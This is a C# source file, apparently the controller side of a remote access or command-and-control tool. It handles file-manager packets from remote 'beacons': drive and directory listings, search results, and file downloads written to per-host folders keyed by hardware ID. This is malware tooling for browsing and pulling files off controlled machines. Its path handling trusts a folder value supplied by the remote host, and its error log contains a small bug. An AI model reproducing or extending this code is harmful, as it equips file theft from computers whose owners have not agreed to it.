using AVASClient.Helper;
using AVASClient.MessagePackLib;
using AVASClient.Services;
using AVASClient.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Avalonia.Threading;
using System.IO;
using System.Collections.Concurrent;

namespace AVASClient.HandlePacket
{
    internal class HandleFileManager
    {
        private static readonly ConcurrentDictionary<string, object> _fileWriteLocks = new ConcurrentDictionary<string, object>();
        public static async Task HandleAsync(ClientMsgPack msg)
        {
            await Task.Run(() => {
                Handle(msg);
            });
        }
        private static void Handle(ClientMsgPack unpack_msgpack)
        {
            try
            {
                string BID = unpack_msgpack.ForcePathObject("BID").GetAsString();// 首先获取BeaconID
                string action = unpack_msgpack.ForcePathObject("Action").GetAsString(); // 获取操作类型
                // 根据操作类型进行不同的处理
                switch (action)
                {
                    case "Drivers": // 驱动器列表
                        {
                            string driverRaw = unpack_msgpack.ForcePathObject("Driver").GetAsString();
                            var items = ParseDrivers(driverRaw);
                            string windowName = "FileManager:" + BID; // 与打开窗口时的 Tag 规则一致
                            Dispatcher.UIThread.Post(async () =>
                            {
                                var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                                if (window != null)
                                {
                                    window.UpdateItemsFromRemote(items, string.Empty);
                                }
                            });
                            break;
                        }
                    case "Path": // 目录内容
                        {
                            string path = unpack_msgpack.ForcePathObject("Path").GetAsString();
                            string itemsRaw = unpack_msgpack.ForcePathObject("Items").GetAsString();
                            var items = ParsePathItems(path, itemsRaw);
                            string windowName = "FileManager:" + BID;
                            Dispatcher.UIThread.Post(async () =>
                            {
                                var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                                if (window != null)
                                {
                                    window.UpdateItemsFromRemote(items, path);
                                }
                            });
                            break;
                        }
                    case "SearchResult":
                    {
                        string root = unpack_msgpack.ForcePathObject("Root").GetAsString();
                        string basePath = unpack_msgpack.ForcePathObject("BasePath").GetAsString();
                        string itemsRaw = unpack_msgpack.ForcePathObject("Items").GetAsString();
                        var results = ParsePathItems(basePath, itemsRaw);
                        string windowName = "FileManager:" + BID;
                        Dispatcher.UIThread.Post(async () =>
                        {
                            var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                            if (window != null)
                            {
                                window.UpdateItemsFromRemote(results, window.CurrentPath);
                            }
                        });
                        break;
                    }
                    case "SearchDone":
                    {
                        // 可选：完成提示
                        break;
                    }
                    case "Ack": // 操作确认
                    {
                        string op = unpack_msgpack.ForcePathObject("Op").GetAsString();
                        int ok = (int)unpack_msgpack.ForcePathObject("Ok").AsInteger;
                        string msg = unpack_msgpack.ForcePathObject("Msg").GetAsString();
                        string windowName = "FileManager:" + BID;
                        Dispatcher.UIThread.Post(async () =>
                        {
                            var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                            if (window != null && ok == 1)
                            {
                                window.RequestRefreshFromRemote();
                            }
                            if (ok != 1)
                            {
                                LogService.Instance.Error($"{op} 失败: {msg}", "HandleFileManager");
                            }
                            // 若是下载失败（例如目录下载未实现），也应推进进度，避免卡在0%
                            if (window != null && op == "Download")
                            {
                                window.OnDownloadItemCompleted(msg ?? string.Empty, 0);
                            }
                        });
                        break;
                    }
                    case "DownloadData":
                    {
                        string fileName = unpack_msgpack.ForcePathObject("FileName").GetAsString();
                        byte[] data = unpack_msgpack.ForcePathObject("Data").GetAsBytes();
                        try
                        {
                            // Resolve HWID via BID
                            var beacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == BID);
                            string hwid = beacon?.HWID ?? BID;
                            string baseDir = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientFolder", hwid, "FileManager");
                            if (!Directory.Exists(baseDir)) Directory.CreateDirectory(baseDir);
                            string safeRelative;
                            try { safeRelative = System.IO.Path.GetRelativePath("/", fileName); } catch { safeRelative = System.IO.Path.GetFileName(fileName); }
                            string target = System.IO.Path.Combine(baseDir, safeRelative);
                            var targetDir = System.IO.Path.GetDirectoryName(target);
                            if (!string.IsNullOrEmpty(targetDir) && !Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                            System.IO.File.WriteAllBytes(target, data ?? Array.Empty<byte>());
                            LogService.Instance.Info($"已保存下载文件: {target}", "HandleFileManager");
                        }
                        catch (Exception ex)
                        {
                            LogService.Instance.Error($"保存下载文件失败: {ex.Message}", "HandleFileManager");
                        }
                        finally
                        {
                            // progress update on window (always advance)
                            string windowName = "FileManager:" + BID;
                            Dispatcher.UIThread.Post(async () =>
                            {
                                var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                                window?.OnDownloadItemCompleted(fileName, data?.Length ?? 0);
                            });
                        }
                        break;
                    }
                    case "DownloadChunk":
                    {
                        string fileName = unpack_msgpack.ForcePathObject("FileName").GetAsString();
                        string path = unpack_msgpack.ForcePathObject("Path").GetAsString();
                        string root = string.Empty;
                        try { root = unpack_msgpack.ForcePathObject("Root").GetAsString(); } catch { root = string.Empty; }
                        long offset = unpack_msgpack.ForcePathObject("Offset").AsInteger;
                        long total = unpack_msgpack.ForcePathObject("Total").AsInteger;
                        int length = (int)unpack_msgpack.ForcePathObject("Length").AsInteger;
                        int completed = (int)unpack_msgpack.ForcePathObject("Completed").AsInteger;
                        byte[] data = unpack_msgpack.ForcePathObject("Data").GetAsBytes();

                        try
                        {
                            var beacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == BID);
                            string hwid = beacon?.HWID ?? BID;
                            string baseDir = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientFolder", hwid, "FileManager");
                            if (!Directory.Exists(baseDir)) Directory.CreateDirectory(baseDir);
                            string safeRelative;
                            if (string.IsNullOrEmpty(root))
                            {
                                try { safeRelative = System.IO.Path.GetRelativePath("/", fileName); } catch { safeRelative = System.IO.Path.GetFileName(fileName); }
                            }
                            else
                            {
                                safeRelative = System.IO.Path.Combine(root, System.IO.Path.GetFileName(fileName));
                            }
                            string target = System.IO.Path.Combine(baseDir, safeRelative);
                            var targetDir = System.IO.Path.GetDirectoryName(target);
                            if (!string.IsNullOrEmpty(targetDir) && !Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                            var lockObj = _fileWriteLocks.GetOrAdd(target, _ => new object());
                            lock (lockObj)
                            {
                                using (var fs = new FileStream(target, FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite))
                                {
                                    fs.Position = offset; // write at specified offset
                                    if (data != null && data.Length > 0)
                                    {
                                        fs.Write(data, 0, data.Length);
                                        fs.Flush(true);
                                    }
                                }
                            }
                            // progress update by bytes（中间进度）
                            string windowName = "FileManager:" + BID;
                            Dispatcher.UIThread.Post(async () =>
                            {
                                var window = await FindForm.FindWindowByNameSafe(windowName) as Form_FileManager;
                                if (window != null)
                                {
                                    // 中间进度
                                    window.OnDownloadChunkProgress(fileName, offset + (data?.Length ?? 0), total);
                                    // 完成时计数
                                    if (completed == 1)
                                    {
                                        window.OnDownloadItemCompleted(fileName, total);
                                        // 下载完成后移除写锁，释放内存
                                        _fileWriteLocks.TryRemove(target, out _);
                                    }
                                }
                            });
                        }
                        catch (Exception ex)
                        {
                            LogService.Instance.Error($"保存分片失败: {ex.Message}", "HandleFileManager");
                        }

                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Error($"处理 FileManager 数据包时发生异常:{ex.ToString}", "HandleFileManager", ex);
            }
        }
        private static List<FileItem> ParseDrivers(string driverRaw)
        {
            var result = new List<FileItem>();
            if (string.IsNullOrEmpty(driverRaw)) return result;
            var parts = driverRaw.Split("-=>", StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i + 2 < parts.Length; i += 3)
            {
                string name = parts[i];
                string type = parts[i + 1];
                string iconB64 = parts[i + 2];
                var icon = DecodeBitmap(iconB64);
                result.Add(new FileItem
                {
                    Name = name,
                    Type = type,
                    DateModified = string.Empty,
                    SizeDisplay = string.Empty,
                    IsDirectory = true,
                    FullPath = name,
                    Icon = icon,
                    IconGlyph = null
                });
            }
            return result;
        }

        private static List<FileItem> ParsePathItems(string basePath, string itemsRaw)
        {
            var result = new List<FileItem>();
            if (string.IsNullOrEmpty(itemsRaw)) return result;
            var lines = itemsRaw.Split('\n', StringSplitOptions.RemoveEmptyEntries);
            foreach (var line in lines)
            {
                var parts = line.Split('|');
                if (parts.Length < 6) continue;
                string name = parts[0];
                string type = parts[1];
                bool isDir = parts[2] == "1";
                long size = 0; long.TryParse(parts[3], out size);
                long ticks = 0; long.TryParse(parts[4], out ticks);
                string iconB64 = parts[5];
                var icon = DecodeBitmap(iconB64);
                var date = new DateTime(ticks, DateTimeKind.Utc).ToLocalTime().ToString("yyyy-MM-dd HH:mm");
                result.Add(new FileItem
                {
                    Name = name,
                    Type = isDir ? "文件夹" : (type.TrimStart('.').ToUpperInvariant() + " 文件"),
                    DateModified = date,
                    SizeDisplay = isDir ? string.Empty : FormatSize(size),
                    IsDirectory = isDir,
                    FullPath = System.IO.Path.Combine(basePath, name),
                    Icon = icon,
                    IconGlyph = null
                });
            }
            return result;
        }

        private static string FormatSize(long bytes)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = bytes;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                return string.Format(System.Globalization.CultureInfo.InvariantCulture, "{0:0.##} {1}", len, sizes[order]);
            }
            catch { return bytes.ToString(); }
        }

        private static Avalonia.Media.Imaging.Bitmap? DecodeBitmap(string base64)
        {
            try
            {
                if (string.IsNullOrEmpty(base64)) return null;
                var bytes = Convert.FromBase64String(base64);
                if (bytes.Length == 0) return null;
                return new Avalonia.Media.Imaging.Bitmap(new MemoryStream(bytes));
            }
            catch { return null; }
        }
    }
}
